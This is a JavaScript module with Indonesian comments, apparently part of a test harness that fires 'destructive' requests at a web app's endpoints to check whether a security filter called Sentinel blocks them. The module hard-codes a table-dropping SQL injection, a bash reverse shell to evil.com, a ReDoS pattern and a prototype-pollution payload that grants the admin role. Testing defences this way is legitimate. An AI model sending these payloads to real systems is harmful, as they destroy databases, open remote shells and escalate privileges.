const { sendRequest } = require('../utils/request');

/**
 * Destructive Attack Module
 * Mencoba serangan yang dirancang untuk merusak integritas data atau mematikan sistem.
 */
async function runDestructiveAttack(stats, vulnerabilities) {
    console.log(`\n💀 MEMULAI SERANGAN DESTRUKTIF & MEMATIKAN...`);
    console.log(`⚠️ PERINGATAN: Serangan ini dirancang untuk merusak sistem jika tidak tertahan oleh Sentinel.`);

    const targets = ['/courses', '/login', '/dashboard/admin/users', '/pricing'];
    const destructivePayloads = [
        { name: 'DB_NUKER', method: 'POST', data: { id: "1'; DROP TABLE users; DROP TABLE courses; --", action: 'delete' } },
        { name: 'RCE_REVERSE_SHELL', method: 'POST', data: { cmd: "bash -i >& /dev/tcp/evil.com/4444 0>&1" } },
        { name: 'SYSCALL_OVERLOAD', method: 'GET', query: { q: "(a+)+$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" } }, // ReDoS
        { name: 'PROTOTYPE_POLLUTION', method: 'PUT', data: { "__proto__": { "role": "admin", "is_admin": true } } }
    ];

    for (const payload of destructivePayloads) {
        for (const target of targets) {
            console.log(`\n🧨 Meluncurkan: ${payload.name} ke ${target}`);
            
            let res;
            if (payload.method === 'GET') {
                const q = new URLSearchParams(payload.query).toString();
                res = await sendRequest(`${target}?${q}`, 'GET');
            } else {
                res = await sendRequest(target, payload.method, payload.data);
            }

            if (res.status === 'BLOCKED') {
                console.log(`   🛡️ SENTINEL BERHASIL: Ancaman mematikan terdeteksi dan diblokir!`);
                stats.blocked++;
            } else if (res.code === 500) {
                console.log(`   ⚠️ SERVER CRASH: Sistem tidak sanggup menangani payload ${payload.name}.`);
                vulnerabilities.push(`Server Crash (500) via ${payload.name} di ${target}`);
                stats.success++;
            } else if (res.status === 'SUCCESS') {
                console.log(`   ❌ SISTEM JEBOL: Payload ${payload.name} berhasil tereksekusi!`);
                vulnerabilities.push(`Sistem jebol oleh serangan DESTRUKTIF ${payload.name} di ${target}`);
                stats.success++;
            } else {
                console.log(`   ✅ TERTOLAK: Permintaan gagal dengan status ${res.code}.`);
                stats.failed++;
            }
        }
    }
}

module.exports = runDestructiveAttack;
